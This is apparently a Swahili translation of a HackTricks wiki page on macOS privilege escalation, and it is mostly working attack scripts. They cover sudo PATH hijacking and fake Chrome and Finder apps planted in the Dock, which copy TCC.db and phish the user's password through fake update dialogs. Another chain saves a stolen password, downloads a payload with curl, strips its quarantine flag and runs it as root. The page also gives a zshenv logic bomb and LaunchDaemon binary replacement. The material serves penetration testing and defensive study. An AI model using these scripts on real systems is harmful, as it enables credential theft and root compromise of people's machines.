# Kuinua Privilege kwenye macOS

{{#include ../../banners/hacktricks-training.md}}

## Kuinua Privilege kwa TCC

Ikiwa umefika hapa ukitafuta kuinua privilege kwa TCC, nenda kwenye:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Mbinu nyingi za privilege-escalation zinazoathiri Linux au mifumo mingine inayofanana na Unix pia hutumika kwenye macOS. Tazama:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Mwingiliano wa Mtumiaji

### Sudo Hijacking

Unaweza kupata mbinu asilia ya [Sudo Hijacking ndani ya chapisho la Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Hata hivyo, macOS **hudumisha** **`PATH`** ya mtumiaji anapotumia **`sudo`**. Hii inamaanisha kuwa njia nyingine ya kutekeleza shambulio hili ni **kuhijack binaries nyingine** ambazo mwathiriwa bado atazitekeleza anapoendesha **sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Kumbuka kwamba mtumiaji anayetumia terminal atakuwa na uwezekano mkubwa wa kuwa na **Homebrew installed**. Kwa hiyo inawezekana kuhijack binaries zilizo katika **`/opt/homebrew/bin`**.

### Kuiga Dock

Kwa kutumia **social engineering** unaweza **kuiga**, kwa mfano, Google Chrome ndani ya dock na kwa kweli kuendesha script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Baadhi ya mapendekezo:

- Kagua Dock ikiwa kuna Chrome, na ikiwa ipo, **ondoa** entry hiyo kisha **ongeza** entry ya **Chrome ya bandia** katika **nafasi ileile** ndani ya array ya Dock.

<details>
<summary>Script ya kuiga Chrome kwenye Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Baadhi ya mapendekezo:

- **Huwezi kuondoa Finder kwenye Dock**, kwa hivyo ikiwa utaiongeza kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili, unahitaji **kuongeza ingizo la Finder bandia mwanzoni mwa array ya Dock**.
- Chaguo jingine ni kutoikiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
- Chaguo jingine la **ku-escalate hadi root bila kuuliza** password kwa kutumia kisanduku cha mazungumzo kibaya, ni kufanya Finder iombe password hiyo ili kutekeleza action yenye privileged:
- Iambie Finder inakili faili mpya ya **`sudo`** hadi **`/etc/pam.d`** (prompt ya kuomba password itaonyesha kwamba "Finder wants to copy sudo")
- Iambie Finder inakili mpya **Authorization Plugin** (Unaweza kudhibiti jina la faili ili prompt ya kuomba password ionyeshe kwamba "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Ulaghai wa password prompt + matumizi tena ya sudo

Malware mara nyingi hutumia vibaya mwingiliano wa mtumiaji ili **kunasa password yenye uwezo wa sudo** na kuitumia tena kupitia programu. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
2. **Rudia password prompts** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi credential (kwa mfano, `/tmp/.pass`) na utekeleze vitendo vya privileged kwa `sudo -S` (password kupitia stdin).

Mfano wa chain ndogo:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Nenosiri lililoibwa linaweza kutumiwa tena **kuondoa Gatekeeper quarantine kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye privileged access, na kuendesha stages za ziada bila mwingiliano wa mtumiaji.<sup>[[1]](#references)</sup>

## Vectors mahususi za macOS za hivi karibuni (2023–2026)

### `AuthorizationExecuteWithPrivileges` iliyopitwa na wakati bado inaweza kutumika

`AuthorizationExecuteWithPrivileges` iliwekwa kuwa deprecated katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Commercial updaters nyingi huita `/usr/libexec/security_authtrampoline` zikiwa na path isiyoaminika. Ikiwa binary lengwa inaweza kuandikwa na mtumiaji, unaweza kupandikiza trojan na kutumia prompt halali:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Unganisha na **masquerading tricks zilizo hapo juu** ili kuwasilisha dialogi ya password inayoaminika.


### Privileged helper / XPC triage

Privescs nyingi za kisasa za macOS za wahusika wengine hufuata pattern ileile: **root LaunchDaemon** hufichua **Mach/XPC service** kutoka **`/Library/PrivilegedHelperTools`**, kisha helper ama **haivalidate client**, huivalidate **ikiwa imechelewa sana** (PID race), au hufichua **root method** inayotumia **user-controlled path/script**. Hii ndiyo bug class iliyo nyuma ya helper bugs nyingi za hivi karibuni katika VPN clients, game launchers na updaters.<sup>[[2]](#references)</sup>

Checklist ya haraka ya triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zingatia kwa makini **helpers** ambazo:

- zinaendelea kukubali requests **baada ya uninstall** kwa sababu job iliendelea kupakiwa katika `launchd`
- zina-execute scripts au kusoma configuration kutoka **`/Applications/...`** au paths nyingine zinazoweza kuandikwa na users wasio-root
- zinategemea validation ya peer inayotumia **PID-based** au **bundle-id-only**, ambayo inaweza kushambuliwa kwa race condition

Kwa maelezo zaidi kuhusu authorization bugs za helpers, angalia [ukurasa huu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Hadi Apple ilipoirekebisha katika **Sonoma 14.5**, **Ventura 13.6.7** na **Monterey 12.7.5**, installs zilizoanzishwa na user kupitia **`Installer.app`** / **`PackageKit.framework`** zingeweza ku-execute **PKG scripts kama root ndani ya environment ya user wa sasa**. Hii inamaanisha kuwa package inayotumia **`#!/bin/zsh`** inge-load **`~/.zshenv`** ya attacker na kui-run kama **root** wakati victim aki-install package.<sup>[[3]](#references)</sup>

Hii inavutia hasa kama **logic bomb**: unahitaji tu foothold katika account ya user na shell startup file inayoweza kuandikwa, kisha unasubiri installer yoyote iliyo hatarini inayotumia **zsh-based** i-execute na user. Hili kwa kawaida **halitumiki** kwa deployments za **MDM/Munki**, kwa sababu hizo hu-run ndani ya environment ya root user.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ikiwa unataka uchambuzi wa kina zaidi kuhusu matumizi mabaya mahususi ya Installer, pia angalia [ukurasa huu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Mgongano wa eneo la Installer kupitia `.localized`

Baadhi ya installers wa wahusika wengine husajili LaunchDaemon ya root ambayo executable yake inarejelewa kwa kutumia pathi isiyobadilika ndani ya `/Applications/Target.app`. Ikiwa attacker anaweza kuunda bundle hiyo kwanza ikiwa na **kitambulisho tofauti cha bundle**, Installer inaweza kuhifadhi decoy hiyo na kuweka app halisi kwenye `/Applications/Target.localized/Target.app`. Daemon bado inaelekeza kwenye pathi ya awali. Kwa hiyo, executable inayodhibitiwa na attacker ndani ya decoy bundle inaweza baadaye kuendeshwa kama root.<sup>[[8]](#references)</sup>

Masharti muhimu ya awali ni:<sup>[[8]](#references)</sup>

1. Attacker anaweza kuunda au kudhibiti pathi ya application inayotarajiwa.
2. Package haiondoi bundle inayokinzana.
3. Job yenye privilege hutumia pathi iliyowekwa moja kwa moja ndani ya bundle hiyo.
4. Mtumiaji au workflow ya MDM hu-install package na kusajili job.

Tafuta bundles zilizohamishwa, kisha kagua targets za LaunchDaemon kwa kutumia enumeration loop katika sehemu inayofuata:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Kisakinishi salama zaidi hutatua eneo la mwisho la bundle na huhifadhi executables zenye privileged katika eneo linalomilikiwa na root kama `/Library/PrivilegedHelperTools`. Pia kinapaswa kuthibitisha ownership na code signing kabla ya kusajili au kuanzisha job.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist inaweza kumilikiwa na root huku `Program` au ingizo la kwanza la `ProgramArguments` likielekeza kwenye directory inayoweza kuandikwa na mtumiaji. Kagua **path nzima**, si mode ya executable pekee. Ikiwa parent directory inaweza kuandikwa, attacker anaweza kubadilisha jina la executable inayomilikiwa na root na kuunda replacement kwenye path hiyo hiyo. Replacement itaendeshwa kama root wakati job itakapoanza tena. Reboot au service restart ya kawaida inatosha. Attacker hahitaji permission ya kuendesha `launchctl bootstrap` katika system domain.<sup>[[7]](#references)</sup>

Orodhesha kila target na parent yake ya moja kwa moja kwanza:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Wakati faili au parent yake inaweza kuandikwa, hifadhi binary ya awali na badilisha path hiyo kwa executable payload. Kisha subiri daemon ambayo tayari imepakiwa ianze upya.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Njia ya `kauth_cred_proc_update` iliyo hatarini ilisasisha `proc_ro.p_ucred` kwa kutumia API ya non-atomic `zalloc_ro_mut`, huku wasomaji wa SMR wakipakia pointer hiyo bila lock. Trigger ya umma hutumia setgid binary iliyoandaliwa maalum. Thread moja hubadilisha kati ya group ID yake halisi na effective group ID, huku thread nyingine ikiingia mara kwa mara kwenye syscall kama vile `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Ichukulie hii kama **race primitive**, si root exploit iliyo tayari kutumika. PoC iliyochapishwa inaonyesha torn credential pointer. Mara nyingi huishia kwenye kernel panic. Mtafiti alifanikiwa kuzalisha corruption hiyo kwenye Intel pekee na hakutoa udhibiti wa deterministic wa credential object iliyotokana nayo. Apple ilibadilisha update hiyo kuwa atomic pointer exchange katika macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass kupitia Migration assistant ("Migraine", CVE-2023-32369)

Ikiwa tayari una root, SIP bado huzuia writes kwenye system locations. **Migraine** bug hutumia vibaya entitlement ya Migration Assistant `com.apple.rootless.install.heritable` ili kuanzisha child process inayorithi SIP bypass na ku-overwrite protected paths (kwa mfano, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Chain hiyo:

1. Pata root kwenye live system.
2. Trigger `systemmigrationd` kwa state iliyoundwa ili i-run attacker-controlled binary.
3. Tumia entitlement iliyorithiwa kupatch SIP-protected files, na persistence itaendelea hata baada ya reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Apple daemons nyingi hukubali **NSPredicate** objects kupitia XPC na hu-validate tu field ya `expressionType`, ambayo inadhibitiwa na attacker. Kwa kuunda predicate inayotathmini arbitrary selectors, unaweza kupata **code execution katika root/system XPC services** (kwa mfano, `coreduetd`, `contextstored`). Ikichanganywa na initial app sandbox escape, hii hutoa **privilege escalation bila user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na zisizo na robust visitor.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Mtumiaji yeyote** (hata wasio na privileges) anaweza kuunda na ku-mount Time Machine snapshot kwa `-o noowners` na **kufikia files ZOTE** za snapshot hiyo, akipita ownership checks kwenye live volume. Privilege pekee inayohitajika ni kwa application inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Commands na maelezo kamili yako kwenye TCC bypasses page:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Hii inaweza kuwa muhimu kwa ku-escalate privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Aina mpya ya Privilege Escalation Bug kwenye macOS na iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: privilege escalation na persistence kupitia insecure folder permissions](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE kupitia .localized directory](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
